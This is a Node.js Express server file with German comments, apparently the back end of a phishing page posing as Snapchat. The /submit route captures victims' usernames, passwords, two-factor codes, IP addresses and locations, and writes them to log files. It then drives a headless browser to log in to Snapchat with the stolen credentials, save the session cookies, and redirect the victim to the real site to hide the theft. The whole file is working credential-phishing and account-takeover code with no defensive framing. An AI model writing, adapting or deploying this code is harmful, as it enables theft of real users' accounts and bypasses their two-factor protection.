const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.post('/submit', async (req, res) => {
  try {
    const { username, password, twoFACode } = req.body; // NEU: 2FA-Code abfangen!
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const logData = {
      timestamp: new Date().toISOString(),
      ip: clientIp,
      userAgent: req.headers['user-agent'],
      username,
      password,
      twoFACode, // 2FA-Code wird mitgeloggt
      latitude: req.body.latitude || "N/A",
      longitude: req.body.longitude || "N/A"
    };

    fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
      if (err) console.error("Log-Fehler:", err);
    });

    console.log("👤 Benutzername:", username);
    console.log("🔑 Passwort:", password);
    console.log("🔢 2FA-Code:", twoFACode); // 2FA-Code wird angezeigt
    console.log("📍 IP:", clientIp);

    // OPTIONAL: Automatischer Login-Versuch mit Puppeteer
    if (username && password && twoFACode) {
      const puppeteer = require('puppeteer');
      (async () => {
        const browser = await puppeteer.launch({ headless: true });
        const page = await browser.newPage();
        await page.goto('https://accounts.snapchat.com');
        
        // Login durchführen
        await page.type('input[name="username"]', username);
        await page.type('input[name="password"]', password);
        await page.click('button[type="submit"]');
        
        // 2FA-Code eingeben (falls nötig)
        await page.waitForSelector('input[name="otp_code"]', { timeout: 5000 });
        await page.type('input[name="otp_code"]', twoFACode);
        await page.click('button[type="submit"]');
        
        // Session-Cookies klauen & speichern
        const cookies = await page.cookies();
        fs.appendFile('cookies.log', JSON.stringify(cookies) + '\n', () => {});
        
        await browser.close();
      })();
    }

    res.redirect('https://snapchat.com'); // Opfer zur echten Seite umleiten

  } catch (error) {
    console.error("❌ Fehler:", error);
    res.status(500).send("Serverfehler");
  }
});
